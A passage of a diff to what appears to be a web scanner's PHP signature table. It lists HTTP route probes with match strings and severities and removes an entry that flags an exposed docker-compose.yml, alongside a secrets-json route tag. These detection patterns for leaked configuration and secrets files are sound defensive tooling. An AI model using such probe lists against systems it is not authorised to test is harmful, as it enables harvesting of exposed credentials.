+          ),
+        ),
+      ),
+    ),
     'PUT /api/v2/simulation' => 
     array (
       'b' => 
@@ -300258,30 +302756,6 @@ a</title>',
           't' => 
           array (
             0 => 'route-secrets-json',
-          ),
-        ),
-      ),
-    ),
-    'GET /docker-compose.yml' => 
-    array (
-      'b' => 
-      array (
-        0 => 
-        array (
-          's' => 200,
-          'bw' => 
-          array (
-            0 => 'services:',
-          ),
-          'nf' => 
-          array (
-          ),
-          'pid' => 'route-docker-compose',
-          'sev' => 'high',
-          'sig' => 0,
-          't' => 
-          array (
-            0 => 'route-docker-compose',
           ),
         ),
       ),
